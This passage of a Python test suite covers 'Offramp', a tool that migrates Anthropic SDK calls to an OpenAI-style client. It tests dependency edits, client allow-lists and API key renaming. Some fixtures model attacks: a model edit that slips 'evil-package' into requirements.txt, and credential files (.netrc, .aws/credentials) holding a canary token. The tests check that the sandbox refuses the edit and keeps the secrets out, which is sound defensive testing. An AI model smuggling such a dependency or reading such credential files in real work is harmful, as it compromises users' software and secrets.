         '[dependency-groups]\nai = ["anthropic>=0.40", "openai>=1.50", "x"]\n'),
        ("[project]\nname = 'x'\ndependencies = [\n  'anthropic'\n]\n",
         "[project]\nname = 'x'\ndependencies = [\n  'anthropic',\n  'openai>=1.50',\n]\n"),
        ('[tool.poetry.dependencies]\nanthropic = "^0.40"\nhttpx = "*"\n',
         '[tool.poetry.dependencies]\nanthropic = "^0.40"\nopenai = ">=1.50"\nhttpx = "*"\n'),
        ('[project]\nname = "x"\ndependencies = ["anthropic", "openai>=2"]\n', None),  # declared already
        ('[project]\nname = "x"\nkeywords = ["anthropic"]\n', None),  # not a requirement list
    ],
    ids=["inline-group", "last-entry-single-quotes", "poetry-table", "openai-declared", "keywords-only"],
)  # fmt: skip
def test_a_pyproject_list_gains_openai_in_its_own_layout(tmp_path, text, expected):
    (tmp_path / "pyproject.toml").write_text(text)

    edits, notes, _ = declare_openai(tmp_path, {"anthropic"})

    assert edits.get("pyproject.toml") == expected
    nowhere = "No requirements*.txt or pyproject.toml here declares `anthropic`: add `openai>=1.50`"
    assert any(n.startswith(nowhere) for n in notes) is ("keywords" in text)


def test_a_poetry_lockfile_is_left_alone_and_the_note_names_its_command(tmp_path):
    (tmp_path / "pyproject.toml").write_text('[tool.poetry.dependencies]\nanthropic = "^0.40"\n')
    (tmp_path / "poetry.lock").write_text("# lock\n")

    edits, notes, _ = declare_openai(tmp_path, {"anthropic"})

    assert sorted(edits) == ["pyproject.toml"]
    assert any(n.startswith("`poetry.lock` is not regenerated by Offramp: run `poetry lock`") for n in notes)


def test_the_model_cannot_edit_a_dependency_file_and_a_check_that_writes_one_is_caught():
    """The dependency edit is Offramp's code: the model may not touch the file, and the backstop holds it as
    Offramp wrote it (a check run that rewrites it is flagged, and the file is put back)."""
    repo = anthropic_tiny("declare-guard", {"requirements.txt": "anthropic\n"})
    sneak = Edit(path="requirements.txt", search="anthropic", replace="anthropic\nevil-package")

    class WritesRequirements(FakeSandbox):
        def check(self):
            result = super().check()
            if len(self.checks) == 3:  # untouched, base, then greet's first check
                (self.repo / "requirements.txt").write_text("anthropic\nrequests\n")
            return result

    llm = patcher_llm(PatchEdits(edits=[sneak]), BudgetExceeded("stop"))
    result = compose_anthropic(
        repo, "declare-guard-run", llm, box=lambda r: WritesRequirements(r, precheck=True)
    )

    first, repair = (call["messages"][-1]["content"] for call in llm.calls)
    assert "requirements.txt is not the code Offramp wrote" in first  # the check's write: the backstop
    assert "requirements.txt is not editable for this site" in repair  # the model's edit: refused
    assert verdict(result, "cs_01").decision == "MANUAL_REVIEW"
    assert verdict(result, "cs_03").decision == "MIGRATE"
    assert result.files["requirements.txt"] == "anthropic\nopenai>=1.50\n"  # as Offramp wrote it, shipped


GUARDED = '''"""Greetings (the real shape: the provider key is checked before the call)."""

import os

GREET_SYSTEM_PROMPT = "You write one-line greetings."
CONFIGURED = bool(os.environ.get("ANTHROPIC_API_KEY"))  # module-level config: left as is


async def greet(name: str):
    api_key = os.environ.get("ANTHROPIC_API_KEY")
    if not api_key:
        return None
    if "ANTHROPIC_API_KEY" not in os.environ or not os.getenv('ANTHROPIC_API_KEY'):
        return None
    try:
        import anthropic

        client = anthropic.AsyncAnthropic(api_key=api_key, timeout=30.0)
        message = await client.messages.create(
            model="claude-haiku-4-5",
            max_tokens=32,
            system=GREET_SYSTEM_PROMPT,
            messages=[{"role": "user", "content": f"Greet {name}."}],
        )
        return message.content[0].text.strip()
    except Exception:
        return None


def key_status():
    return "ANTHROPIC_API_KEY" in os.environ  # another function: left as is
'''


def test_the_migrated_functions_own_key_checks_check_the_token_factory_key():
    out = _prepared(GUARDED)

    function = out[out.index("async def greet") : out.index("def key_status")]
    assert 'api_key = os.environ.get("NEBIUS_API_KEY")\n    if not api_key:\n        return None' in function
    assert """if "NEBIUS_API_KEY" not in os.environ or not os.getenv('NEBIUS_API_KEY'):""" in function
    assert "ANTHROPIC" not in function
    assert 'CONFIGURED = bool(os.environ.get("ANTHROPIC_API_KEY"))' in out  # module level: untouched
    assert '    return "ANTHROPIC_API_KEY" in os.environ' in out  # another function: untouched


def test_a_guarded_site_migrates_its_key_check_runs_under_the_probe_and_the_pr_lists_what_was_left():
    repo = anthropic_tiny("guarded", module=GUARDED)
    write_case(repo, "cs_01", {"name": "Ana"}, "You write one-line greetings.", "Greet Ana.")

    result = compose_anthropic(repo, "guarded-run")

    assert verdict(result, "cs_01").decision == "MIGRATE"
    assert result.verification["cs_01"] == (
        "probe: run in the sandbox with case cs_01:001, it sends the evaluated request"
    )  # the guard passed: the probe sets NEBIUS_API_KEY, which the function now checks
    notes = result.change_notes
    renamed = "`greet` (`tinyapp/greet.py`) now checks `NEBIUS_API_KEY` where it checked `ANTHROPIC_API_KEY`"
    assert any(n.startswith(renamed) for n in notes)
    assert any(
        n.startswith("`tinyapp/greet.py:6` (at module level) still reads `ANTHROPIC_API_KEY`") for n in notes
    )
    assert any("(in `key_status`) still reads `ANTHROPIC_API_KEY`" in n for n in notes)


# ---------------------------------------------------------------- fix round 1: I1, the client allow-list

CTOR = 'client = anthropic.AsyncAnthropic(api_key=os.environ.get("ANTHROPIC_API_KEY"), timeout=30.0)'
BEDROCK = 'anthropic.AsyncAnthropicBedrock(aws_region="us-east-1")'
LAZY = """import anthropic

PROMPT = "You write one-line greetings."
_client = None


def _get_client():
    global _client
    if _client is None:
        _client = anthropic.AsyncAnthropic()
    return _client


async def greet(name):
    {body}
    return message.content[0].text
"""
CALL = (
    'message = await {receiver}.messages.create(model="claude-haiku-4-5", max_tokens=32, system=PROMPT, '
    'messages=[{{"role": "user", "content": name}}])'
)
CLASS_ATTRIBUTE = LAZY.replace("_client = None\n", "\n\nclass _S:\n    client = anthropic.AsyncAnthropic()\n")
METHOD_SELF = """import anthropic

PROMPT = "You write one-line greetings."


class Greeter:
    def __init__(self):
        self.client = anthropic.AsyncAnthropic()

    async def greet(self, name):
        {body}
        return message.content[0].text
"""


@pytest.mark.parametrize(
    ("source", "function", "shown"),
    [
        (ASYNC_GREET.replace(CTOR, f"client = {BEDROCK}"), "greet",
         BEDROCK),
        (ASYNC_GREET.replace(CTOR, 'client = anthropic.AnthropicVertex(region="us-east5")'), "greet",
         'anthropic.AnthropicVertex(region="us-east5")'),
        (ASYNC_GREET.replace("import anthropic\n", "import openai\n").replace(
            CTOR, 'client = openai.AsyncAzureOpenAI(api_version="2024-06-01")'), "greet",
         'openai.AsyncAzureOpenAI(api_version="2024-06-01")'),
        (LAZY.format(body="client = _get_client()\n    " + CALL.format(receiver="client")), "greet",
         "_get_client()"),
        (LAZY.format(body=CALL.format(receiver="_get_client()")), "greet", "_get_client()"),
        (CLASS_ATTRIBUTE.format(body=CALL.format(receiver="_S.client")), "greet", "_S.client"),
        (METHOD_SELF.format(body=CALL.format(receiver="self.client")), "Greeter.greet", "self.client"),
        (ASYNC_GREET.replace(CTOR, "client = make_client()"), "greet", "make_client()"),
    ],
    ids=["bedrock", "vertex", "azure", "lazy-global", "lazy-global-chained", "class-attribute", "self-client",
         "helper"],
)  # fmt: skip
def test_a_client_outside_the_allow_list_is_a_manual_review_and_nothing_is_rewritten(source, function, shown):
    """Review I1: each of these was rewritten to `chat.completions.create` on the old (or another vendor's)
    client and passed conformance. Only a parameter, or a client built in the function from exactly
    anthropic.(Async)Anthropic / openai.(Async)OpenAI (imports resolved), is rewritten."""
    with pytest.raises(Unsupported, match=re.escape(f"client type not recognised: `{shown}`")):
        _rewrite_call(source, _built_site(function), {}, "PROMPT", ASYNC_PARAMS, 100, client=CLIENT_MODULE)


def test_an_aliased_import_of_an_allowed_client_resolves_and_is_rewritten():
    source = (
        ASYNC_GREET.replace("        import anthropic\n\n", "")
        .replace("import logging\n", "import logging\n\nfrom anthropic import AsyncAnthropic as Claude\n")
        .replace(CTOR, "client = Claude(timeout=5)")
    )

    out = _prepared(source)  # conformance included

    assert (
        "client = token_factory_async_client(timeout=5)" in out and "Claude(" not in out.split("import")[-1]
    )


def test_an_optional_imports_none_fallback_still_resolves_to_the_allowed_client():
    optional = (
        "try:\n    from anthropic import AsyncAnthropic\nexcept ImportError:\n    AsyncAnthropic = None\n"
    )
    source = (ASYNC_GREET.replace("        import anthropic\n\n", "")
              .replace("import logging\n", f"import logging\n\n{optional}")
              .replace(CTOR, "client = AsyncAnthropic(timeout=5)"))  # fmt: skip

    assert "client = token_factory_async_client(timeout=5)" in _prepared(source)


@pytest.mark.parametrize(
    "built",
    [
        "        async with anthropic.AsyncAnthropic() as client:\n            pass\n",
        "        client: anthropic.AsyncAnthropic = anthropic.AsyncAnthropic()\n",
    ],
    ids=["with", "annotated"],
)
def test_a_client_built_by_with_or_an_annotated_assignment_in_the_function_is_refused(built):
    source = ASYNC_GREET.replace(f"        {CTOR}\n", built)

    with pytest.raises(Unsupported, match="built by `with`, an annotated assignment or more than once"):
        _rewrite_call(source, _built_site(), {}, "PROMPT", ASYNC_PARAMS, 100, client=CLIENT_MODULE)


def test_conformance_requires_the_shipped_calls_client_to_be_the_token_factory_client():
    site = _built_site()
    out, constants, system_name, *_ = _prepare(
        ASYNC_GREET, site, ASYNC_SPEC, ASYNC_PARAMS, 100, client=CLIENT_MODULE
    )
    assert conformance(out, site, ASYNC_PARAMS, constants, system_name) == []

    other = out.replace("client = token_factory_async_client(timeout=30.0)", "client = make_client()")

    assert "the call's client `client` is not the Token Factory client" in conformance(
        other, site, ASYNC_PARAMS, constants, system_name
    )


def test_an_unrecognised_client_ends_as_a_manual_review_with_its_reason_and_ships_nothing():
    source = ASYNC_GREET.replace(CTOR, f"client = {BEDROCK}")
    repo = anthropic_tiny("unrecognised-client", module=source)
    llm = patcher_llm()  # no reply queued: nobody may be asked

    result = compose_anthropic(repo, "unrecognised-client-run", llm)

    greet = verdict(result, "cs_01")
    assert greet.decision == "MANUAL_REVIEW" and llm.calls == []
    assert greet.reason == (
        "patch not composed: client type not recognised: "
        '`anthropic.AsyncAnthropicBedrock(aws_region="us-east-1")`'
    )
    assert GREET not in result.files and verdict(result, "cs_03").decision == "MIGRATE"


# ---------------------------------------------------------------- fix round 1: I2, a safe dependency edit

PIP_COMPILE = (
    "#\n# This file is autogenerated by pip-compile with Python 3.12\n# by the following command:\n#\n"
    "#    pip-compile --output-file=requirements.txt requirements.in\n#\n"
    "anthropic==0.40.0\n    # via -r requirements.in\n"
)
UV_COMPILE = (
    "# This file was autogenerated by uv via the following command:\n"
    "#    uv pip compile requirements.in -o requirements.txt\nanthropic==0.40.0\n"
)


def requirement_lines(text: str) -> list[str]:
    """Each logical requirement line, read the way pip reads them (continuations joined, comments dropped)."""
    joined = re.sub(r"\\\r?\n", "", text)
    return [ln for ln in (re.sub(r"(^|\s)#.*$", "", x).strip() for x in joined.splitlines()) if ln]


@pytest.mark.parametrize(
    ("text", "expected"),
    [
        ('anthropic>=0.40 \\\n    ; python_version >= "3.9"\nhttpx\n',
         'anthropic>=0.40 \\\n    ; python_version >= "3.9"\nopenai>=1.50\nhttpx\n'),
        ("anthropic>=0.40  # the SDK\nhttpx", "anthropic>=0.40  # the SDK\nopenai>=1.50\nhttpx"),
        ("anthropic>=0.40\r\nhttpx\r\n", "anthropic>=0.40\r\nopenai>=1.50\r\nhttpx\r\n"),
    ],
    ids=["continued-marker", "comment", "crlf"],
)  # fmt: skip
def test_openai_is_a_new_logical_line_after_the_sdks_whole_requirement(tmp_path, text, expected):
    """Review I2: inserted after the physical line, `openai>=1.50` became part of a continued requirement
    (`Trailing '\\ openai>=1.50' is not allowed`)."""
    (tmp_path / "requirements.txt").write_bytes(text.encode())

    edits, *_ = declare_openai(tmp_path, {"anthropic"})

    assert edits["requirements.txt"] == expected
    lines = requirement_lines(expected)
    assert "openai>=1.50" in lines and all(Requirement(ln) for ln in lines)  # every requirement parses


NOT_EDITED = "so Offramp did not edit it: add"
HASH = "sha256:" + "0" * 64


@pytest.mark.parametrize(
    ("files", "note"),
    [
        ({"requirements.txt": f"anthropic==0.40.0 \\\n    --hash={HASH}\n"},
         f"`requirements.txt` pins hashes, {NOT_EDITED} `openai>=1.50` with its `--hash` values"),
        ({"requirements.txt": PIP_COMPILE, "requirements.in": "anthropic\n"},
         f"`requirements.txt` is compiled (pip-compile), {NOT_EDITED} the line `openai>=1.50` to "
         "`requirements.in` beside `anthropic`, then recompile with "
         "`pip-compile --output-file=requirements.txt requirements.in`"),
        ({"requirements.txt": UV_COMPILE},
         f"`requirements.txt` is compiled (uv), {NOT_EDITED} the line `openai>=1.50` to the file it is "
         "compiled from beside `anthropic`, then recompile with `uv pip compile requirements.in -o "
         "requirements.txt`"),
        ({"requirements.txt": "anthropic==0.40.0\n", "requirements.in": "anthropic\n"},
         f"`requirements.txt` is compiled (pip-compile), {NOT_EDITED} the line `openai>=1.50` to "
         "`requirements.in`"),
    ],
    ids=["hashed", "pip-compile-with-in", "uv-compile", "sibling-in-only"],
)  # fmt: skip
def test_a_hashed_or_compiled_requirements_file_is_a_lockfile_and_the_pr_says_what_to_add(
    tmp_path, files, note
):
    for path, text in files.items():
        (tmp_path / path).write_text(text)

    edits, notes, _ = declare_openai(tmp_path, {"anthropic"})

    assert edits == {} and any(n.startswith(note) for n in notes), notes


def test_a_pyproject_pinning_openai_elsewhere_is_left_alone_with_a_note(tmp_path):
    """Review Minor 1: the extra gained `openai>=1.50` beside an `openai==1.30.0` pin: `uv lock` fails."""
    (tmp_path / "pyproject.toml").write_text(
        '[project]\nname = "x"\ndependencies = ["openai==1.30.0"]\n\n'
        '[project.optional-dependencies]\nclaude = ["anthropic"]\n'
    )

    edits, notes, _ = declare_openai(tmp_path, {"anthropic"})

    assert edits == {}
    assert notes == [
        "`pyproject.toml` `project.optional-dependencies.claude` declares `anthropic` but not openai, which "
        "`project.dependencies` declares: Offramp left the file as it is (that openai pin decides); check "
        "the migrated code's environment installs it"
    ]


def test_a_crlf_pyproject_and_requirements_keep_their_line_endings_in_what_ships():
    """Review Minor 2: read_text/write_text turned CRLF into LF, so the PR rewrote every line."""
    pyproject = TINY_PYPROJECT.replace("dependencies = []", DEPS).replace("\n", "\r\n")
    repo = anthropic_tiny("declare-crlf", {"requirements.txt": "anthropic\r\nhttpx\r\n"})
    (repo / "pyproject.toml").write_bytes(pyproject.encode())

    result = compose_anthropic(repo, "declare-crlf-run")

    assert result.files["requirements.txt"] == "anthropic\r\nopenai>=1.50\r\nhttpx\r\n"
    assert result.files["pyproject.toml"] == pyproject.replace(
        '"anthropic>=0.40",\r\n', '"anthropic>=0.40",\r\n    "openai>=1.50",\r\n'
    )


# ---------------------------------------------------------------- fix round 1: I4, tracked files only

SECRETS = (".envrc", ".netrc", ".pypirc", ".secrets.toml", ".streamlit/secrets.toml", ".aws/credentials",
           "service-account.json")  # fmt: skip  # the review's probe set
CANARY = "canary-secret-123"


GIT_CRYPT = {".gitattributes": "secrets/** filter=git-crypt diff=git-crypt\n", "secrets/prod.env": CANARY}


def git_repo(repo: Path, tracked: dict[str, str]) -> Path:
    """A git checkout holding `tracked`, plus the review's secret files: the first half git-ignored, the
    rest merely untracked, and a git-crypt file tracked as plaintext (an unlocked checkout). Every secret
    holds CANARY."""
    ignored = SECRETS[: len(SECRETS) // 2]
    for path, text in {**tracked, **GIT_CRYPT, ".gitignore": "".join(f"{p}\n" for p in ignored)}.items():
        (repo / path).parent.mkdir(parents=True, exist_ok=True)
        (repo / path).write_text(text)
    git = ["git", "-C", str(repo), "-c", "user.name=t", "-c", "user.email=t@example.com"]
    subprocess.run([*git, "init", "-q"], check=True)
    subprocess.run([*git, "add", "."], check=True)
    subprocess.run([*git, "commit", "-qm", "init"], check=True)
    for path in SECRETS:
        (repo / path).parent.mkdir(parents=True, exist_ok=True)
        (repo / path).write_text(f"TOKEN={CANARY}\n")
    return repo


def test_a_git_checkouts_image_takes_its_tracked_files_only(monkeypatch, tmp_path):
    """Review I4: every git-ignored or untracked secret file but .env* reached the image, built with the
    network on and kept in the host's Docker."""
    monkeypatch.delenv(sandbox_module.UNTRACKED_OPT_IN)
    repo = git_repo(tmp_path / "repo", {"pyproject.toml": "[project]\nname = 'x'\nversion = '0'\n",
                                        "pkg/__init__.py": "VALUE = 1\n"})  # fmt: skip
    _, contexts = fake_docker(monkeypatch)

    assert Sandbox(repo, docker=True).check().ok

    files = contexts[0]
    assert "repo/pkg/__init__.py" in files and "repo/.gitignore" in files
    assert "repo/secrets/prod.env" not in files  # re-review R1-I2: tracked, but git-crypt's
    assert not any(p.removeprefix("repo/") in SECRETS for p in files) and CANARY not in "".join(
        files.values()
    )


def test_a_plain_directory_reaches_no_image_without_the_opt_in(monkeypatch, tmp_path):
    monkeypatch.delenv(sandbox_module.UNTRACKED_OPT_IN)
    (tmp_path / "pyproject.toml").write_text("[project]\nname = 'x'\nversion = '0'\n")
    _, contexts = fake_docker(monkeypatch)

    result = Sandbox(tmp_path, docker=True).check()

    assert not result.ok and contexts == []
    assert "is not a git checkout: the sandbox takes only a git repository's tracked files" in result.output


def test_the_patch_stage_copies_and_shows_the_sandbox_only_a_checkouts_tracked_files(monkeypatch):
    """The copy is what the checks mount and the image is built from: neither may hold an untracked secret."""
    monkeypatch.delenv(sandbox_module.UNTRACKED_OPT_IN)
    src = work_dir("tracked-src") / "src"
    shutil.copytree(TINY, src, ignore=shutil.ignore_patterns(".venv", "__pycache__"))
    git_repo(src, {})
    seen = []

    def box(repo):
        made = FakeSandbox(repo, precheck=True)
        seen.append(made)
        return made

    result = compose_patches(src, tiny_sites(), tiny_verdicts(), tiny_adapters(), patcher_llm(),
                             work_dir("tracked-run"), config=CONFIG, build_request=BUILD,
                             sandbox_factory=box)  # fmt: skip

    copy = SANDBOXES / "tracked-run" / "repo"
    assert result.combined == ["cs_01", "cs_03"]
    assert not any((copy / p).exists() for p in [*SECRETS, "secrets/prod.env"]) and (copy / GREET).is_file()
    assert (
        seen[0].files and GREET in seen[0].files and not {*SECRETS, "secrets/prod.env"} & set(seen[0].files)
    )


# ---------------------------------------------------------------- fix round 1: minors


def test_the_key_rename_stays_in_the_body_and_out_of_f_strings():
    """Review Minor 3: an f-string's text, a decorator's argument and a parameter default changed too."""
    source = GUARDED.replace(
        "async def greet(name: str):\n",
        '@requires("ANTHROPIC_API_KEY")\nasync def greet(name: str, key: str = "ANTHROPIC_API_KEY"):\n'
        '    label = f"ANTHROPIC_API_KEY{name}"\n',
    ).replace("import os\n", "import os\n\n\ndef requires(name):\n    return lambda f: f\n")

    out = _prepared(source)

    assert '@requires("ANTHROPIC_API_KEY")' in out and 'key: str = "ANTHROPIC_API_KEY"' in out
    assert 'label = f"ANTHROPIC_API_KEY{name}"' in out
    assert 'api_key = os.environ.get("NEBIUS_API_KEY")' in out


def test_the_pr_names_deploy_files_unread_modules_a_replaced_client_and_anthropic_left_in_a_handler():
    """Review Minors 4, 5 and 8: deployment config naming the old key, .py files this Python cannot parse,
    an existing client module the run replaced, and an `except anthropic.APIError` the new client never
    raises into."""
    module = GUARDED.replace("    except Exception:\n", "    except anthropic.APIError:\n")
    extra = {"render.yaml": "envVars:\n  - key: ANTHROPIC_API_KEY\n", "legacy/old.py": "print 'py2'\n",
             "tinyapp/offramp_client.py": "OLD = 1\n"}  # fmt: skip
    repo = anthropic_tiny("pr-notes", extra, module=module)

    notes = compose_anthropic(repo, "pr-notes-run").change_notes

    assert notes[0] == "`tinyapp/offramp_client.py` existed and was replaced by this run's client module"
    deploy = "`render.yaml` mentions `ANTHROPIC_API_KEY`: wherever this repo deploys, set `NEBIUS_API_KEY`"
    assert any(n.startswith(deploy) for n in notes)
    assert any(
        n.startswith("1 .py file(s) could not be parsed here") and "`legacy/old.py`" in n for n in notes
    )
    assert any(
        n.startswith("`greet` (`tinyapp/greet.py`) still refers to `anthropic.APIError`") for n in notes
    )


# ---------------------------------------------------------------- fix round 2: R1-I1, the parameter path

PLANT_SIGNATURE = 'def greet(client, name: str, tone: str = "warm"):'


@pytest.mark.parametrize("default", ["DEFAULT", "anthropic.Anthropic()"], ids=["module-client", "inline"])
def test_a_client_parameters_default_other_than_none_is_refused(default):
    """Re-review R1-I1 (`client=DEFAULT`): with `DEFAULT = anthropic.Anthropic()`, every caller that omits the
    argument sent `chat.completions.create` to the old client, and conformance passed it."""
    source = "import anthropic\n\nDEFAULT = anthropic.Anthropic()\n" + PLANT.replace(
        PLANT_SIGNATURE, f'def greet(name: str, tone: str = "warm", client={default}):'
    )
    shown = re.escape(f"client type not recognised: `{default}` (the default of its `client` parameter)")

    with pytest.raises(Unsupported, match=shown):
        _rewrite_call(source, _built_site(), {}, "PROMPT", ASYNC_PARAMS, 100, client=CLIENT_MODULE)


HANDLER = """import anthropic

from tinyapp.greet import greet

CLIENT = anthropic.Anthropic()


def handle(name, svc, *args, **kwargs):
    client = anthropic.Anthropic(timeout=10)
    a = greet(client, name)
    b = greet(CLIENT, name)
    c = greet(anthropic.Anthropic(), name)
    d = greet(svc.client, name)
    e = greet(make_client(), name)
    f = greet(name=name)
    g = greet(*args)
    h = greet(name=name, **kwargs)
    return [greet, a, b, c, d, e, f, g, h]
"""


@pytest.mark.parametrize(
    "signature", [PLANT_SIGNATURE, 'def greet(client=None, name: str = "", tone: str = "warm"):'],
    ids=["no-default", "none-default"],
)  # fmt: skip
def test_conformance_names_every_caller_that_hands_the_function_an_unknown_client(signature):
    """Re-review R1-I1 (`summarize(client, ...)` with a local old client, `summarize(CLIENT, ...)` with a
    module-level one): left as they were, and nothing refused the site. Only a Token Factory client written
    in the call (an inline constructor, which `rewrite_callers` rewires) is known."""
    site = _built_site()
    out, constants, system_name, rewritten, _ = _prepare(
        PLANT.replace(PLANT_SIGNATURE, signature), site, ASYNC_SPEC, ASYNC_PARAMS, 100, client=CLIENT_MODULE
    )
    handler = rewrite_callers({"app.py": HANDLER}, GREET, "greet", CLIENT_MODULE)["app.py"]
    lines = [line.strip() for line in handler.splitlines()]
    at = {line[0]: n for n, line in enumerate(lines, 1) if " = greet(" in line} | {
        "return": lines.index("return [greet, a, b, c, d, e, f, g, h]") + 1
    }

    problems = conformance(
        out, site, ASYNC_PARAMS, constants, system_name, None, {GREET: out, "app.py": handler}
    )

    assert rewritten and "c = greet(token_factory_client(), name)" in lines
    assert problems == [
        "the client `client` its callers hand `greet` is not known to be the Token Factory client: "
        f"`app.py:{at['a']}` `greet(...)` hands `client`; `app.py:{at['b']}` `greet(...)` hands `CLIENT`; "
        f"`app.py:{at['d']}` `greet(...)` hands `svc.client`; "
        f"`app.py:{at['e']}` `greet(...)` hands `make_client()`; "
        f"`app.py:{at['f']}` `greet(...)` omits `client`; "
        f"`app.py:{at['g']}` `greet(...)` hands it on through `*`; "
        f"`app.py:{at['h']}` `greet(...)` hands it on through `**`; "
        f"`app.py:{at['return']}` uses `greet` without calling it"
    ]
    inline = (
        HANDLER.split("\n\n\ndef")[0] + "\n\n\ndef main():\n    return greet(anthropic.Anthropic(), 'Ana')\n"
    )
    rewired = rewrite_callers({"app.py": inline}, GREET, "greet", CLIENT_MODULE)["app.py"]
    assert conformance(out, site, ASYNC_PARAMS, constants, system_name, None, {"app.py": rewired}) == []


CLI_WITH_A_MODULE_CLIENT = (
    "import anthropic\n\nfrom tinyapp.greet import greet\n\nCLIENT = anthropic.Anthropic()\n\n\n"
    'def main():\n    return greet(CLIENT, "Ana")\n'
)


def test_a_site_whose_caller_hands_it_an_old_client_is_a_manual_review_naming_the_caller():
    repo = anthropic_tiny("handed-client", {"tinyapp/cli.py": CLI_WITH_A_MODULE_CLIENT})
    llm = patcher_llm()  # no reply queued: nobody may be asked

    result = compose_anthropic(repo, "handed-client-run", llm)

    greet = verdict(result, "cs_01")
    assert greet.decision == "MANUAL_REVIEW" and llm.calls == []
    assert greet.reason == (
        "patch not composed: Offramp's own rewrite does not carry the evaluated request: the client "
        "`client` its callers hand `greet` is not known to be the Token Factory client: `tinyapp/cli.py:9` "
        "`greet(...)` hands `CLIENT`"
    )
    assert GREET not in result.files and "tinyapp/cli.py" not in result.files
    assert verdict(result, "cs_03").decision == "MIGRATE"


# ---------------------------------------------------------------- fix round 2: minors


@pytest.mark.parametrize(
    ("sources", "sites", "refused"),
    [
        ({"api/main.py": "import db\n", "api/db.py": "", "jobs/b.py": ""}, ["api/main.py", "jobs/b.py"],
         "the sites span several folders, which would share one `offramp_client` module at the import root "
         "by bare name, but `api/` imports its own modules by bare name"),
        ({"api/main.py": "import db\n", "api/db.py": "", "offramp_client.py": "OLD = 1\n"}, ["api/main.py"],
         "`offramp_client.py` could shadow this run's `api/offramp_client.py`, which the sites import by "
         "bare name `offramp_client`"),
        ({"a.py": "", "tools/offramp_client.py": "OLD = 1\n"}, ["a.py"],
         "`tools/offramp_client.py` could shadow this run's `offramp_client.py`"),
    ],
    ids=["folder-on-sys-path-among-several", "an-earlier-root-module", "an-earlier-folder-module"],
)  # fmt: skip
def test_a_bare_client_import_that_may_miss_this_runs_module_is_refused(sources, sites, refused):
    """Review Minor 5: a bare `offramp_client` resolves to whichever folder is first on sys.path."""
    repo = work_dir("location-shadow")
    for path, text in sources.items():
        (repo / path).parent.mkdir(parents=True, exist_ok=True)
        (repo / path).write_text(text)

    with pytest.raises(Unsupported, match=re.escape(refused)):
        client_location(repo, sites)


def test_a_dotted_client_import_is_not_shadowed_by_a_bare_module():
    repo = work_dir("location-dotted")
    for path in ("api/report.py", "offramp_client.py"):
        (repo / path).parent.mkdir(parents=True, exist_ok=True)
        (repo / path).write_text("")

    assert client_location(repo, ["api/report.py"]) == ("api/offramp_client.py", "api.offramp_client")


def image_of(run: list[str]) -> str:
    return run[run.index("-w") + 2]  # docker run ... -w /repo <image> <cmd>


@pytest.mark.parametrize("declared", [True, False], ids=["direct-dependency", "not-declared"])
def test_the_openai_layer_is_on_the_patched_image_only_and_only_for_a_direct_dependency(
    monkeypatch, declared
):
    """Review re-review Minor 3: the layer was on the untouched check's image too, and on any image where
    anthropic imports, a transitive dependency included."""
    pyproject = TINY_PYPROJECT.replace("dependencies = []", DEPS) if declared else TINY_PYPROJECT
    repo = anthropic_tiny(f"layer-{declared}", {"pyproject.toml": pyproject})
    runs, contexts = fake_docker(monkeypatch)

    result = compose_anthropic(repo, f"layer-{declared}-run", box=lambda r: Sandbox(r, docker=True))

    layers = [c["Dockerfile"] for c in contexts if c["Dockerfile"].startswith("FROM offramp-sandbox:")]
    assert "openai" not in contexts[0]["Dockerfile"] and not image_of(runs[0]).endswith("-openai")
    assert result.combined == ["cs_01", "cs_03"]
    if declared:
        assert layers and '"openai>=1.50"' in layers[0] and 'import anthropic"' in layers[0]
        assert image_of(runs[-1]).endswith("-openai")
    else:
        assert layers == [] and not any(image_of(r).endswith("-openai") for r in runs)


def git(repo: Path, *args: str) -> None:
    """git with no global config (a global LFS filter would run on `add`)."""
    env = {**os.environ, "GIT_CONFIG_GLOBAL": os.devnull}
    config = ["-c", "user.name=t", "-c", "user.email=t@example.com", "-c", "protocol.file.allow=always"]
    subprocess.run(["git", "-C", str(repo), *config, *args], check=True, env=env, capture_output=True)


def test_tracked_files_drop_filtered_files_and_take_submodules_and_a_monorepo_subfolder(tmp_path):
    """Re-review R1-I2: a git-crypt file in an unlocked checkout is tracked plaintext. Minors 1 and 2: an
    initialised submodule's files were missing; a subfolder of a checkout needed the untracked opt-in."""
    sub = tmp_path / "sub-src"
    for path, text in {
        ".gitattributes": "sec/** filter=git-crypt\n",
        "sec/k.env": CANARY,
        "lib.py": "",
        "infosub.env": CANARY,
    }.items():
        (sub / path).parent.mkdir(parents=True, exist_ok=True)
        (sub / path).write_text(text)
    git(sub, "init", "-q")
    git(sub, "add", ".")
    git(sub, "commit", "-qm", "s")
    repo = tmp_path / "repo"
    files = {".gitattributes": "secrets/** filter=git-crypt diff=git-crypt\nbig/** filter=lfs -text\n"
                               "odd.txt filter\nplain.txt -filter\n",
             "secrets/prod.env": CANARY, "big/model.bin": "lfs pointer", "odd.txt": "", "plain.txt": "",
             "pkg/__init__.py": "", "pkg/mod.py": ""}  # fmt: skip
    for path, text in files.items():
        (repo / path).parent.mkdir(parents=True, exist_ok=True)
        (repo / path).write_text(text)
    git(repo, "init", "-q")
    git(repo, "add", ".")
    git(repo, "submodule", "add", "-q", str(sub), "vendor/sub")
    git(repo, "commit", "-qm", "r")
    (repo / "scratch").mkdir()
    (repo / "scratch" / "notes.py").write_text(CANARY)
    # re-review R2-m2: a filter in the submodule's own info/attributes, which only the submodule reads
    (repo / ".git" / "modules" / "vendor" / "sub" / "info").mkdir(parents=True, exist_ok=True)
    (repo / ".git" / "modules" / "vendor" / "sub" / "info" / "attributes").write_text(
        "infosub.env filter=crypt\n"
    )

    assert sandbox_module.git_files(repo) == (
        [".gitattributes", ".gitmodules", "big/model.bin", "pkg/__init__.py", "pkg/mod.py", "plain.txt",
         "vendor/sub/.gitattributes", "vendor/sub/lib.py"],
        ["odd.txt", "secrets/prod.env", "vendor/sub/infosub.env", "vendor/sub/sec/k.env"],
    )  # fmt: skip
    assert sandbox_module.tracked_files(repo / "pkg") == ["__init__.py", "mod.py"]
    assert sandbox_module.tracked_files(repo / "scratch") is None  # nothing tracked there: a plain directory
    assert sandbox_module.tracked_files(tmp_path / "sub-src" / "sec") == []  # every file filtered


# ---------------------------------------------------------------- fix round 3: references resolved, not named

SUMMARIZE = """import asyncio

import anthropic

PROMPT = "P"


async def summarize(client, text):
    message = await client.messages.create(
        model="claude-haiku-4-5", max_tokens=32, system=PROMPT, messages=[{"role": "user", "content": text}]
    )
    return message.content[0].text
"""
SUMMARIZE_SITE = CallSite(id="cs_01", file="app/summarize.py", lines=[8, 12], sdk="anthropic", call="c",
                          function="summarize", prompt_source="fstring")  # fmt: skip
GO = "\n\nasync def go(t, obj):\n    return await {call}\n"
